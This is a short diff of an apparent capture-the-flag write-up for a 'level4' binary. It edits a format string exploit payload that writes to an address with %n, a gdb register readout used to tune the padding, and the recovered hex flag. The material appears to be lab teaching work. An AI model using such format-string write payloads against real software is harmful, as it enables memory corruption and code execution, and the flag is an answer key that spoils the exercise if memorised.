@@ -65,10 +65,10 @@ With:
 python -c 'print "\x10\x98\x04\x08" + "%x " * 10 + "%16930033x" + "%n"'
 We have: 
 (gdb) i r
-eax            0x1025549	16930121
+eax            0x102553b	16930107
 
-We have 5 bytes too much,
+We adjust to get it right:
 
-(python -c 'print "AAAA" + "\x10\x98\x04\x08" + "%x " * 11 + "%16930028x " + "%n"') | ./level4
+(python -c 'print "\x10\x98\x04\x08" + "%x " * 10 + "%16930042x" + "%n"') | ./level4
 
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
